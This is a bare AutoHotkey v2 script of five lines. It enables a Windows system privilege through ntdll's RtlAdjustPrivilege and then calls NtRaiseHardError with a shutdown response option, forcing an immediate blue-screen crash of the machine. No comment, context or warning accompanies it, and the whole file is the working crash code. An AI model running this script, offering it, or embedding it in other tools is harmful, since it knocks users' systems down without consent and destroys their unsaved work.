#Requires AutoHotkey v2.0
a := Buffer(1)
DllCall("ntdll.dll\RtlAdjustPrivilege", "uint", 19, "int", 1, "int", 0, "ptr", a.Ptr)
resp := Buffer(8)
DllCall("ntdll.dll\NtRaiseHardError", "int", 0xC0000420, "uint", 0, "uint", 0, "uint", 0, "uint", 6, "ptr", resp.Ptr)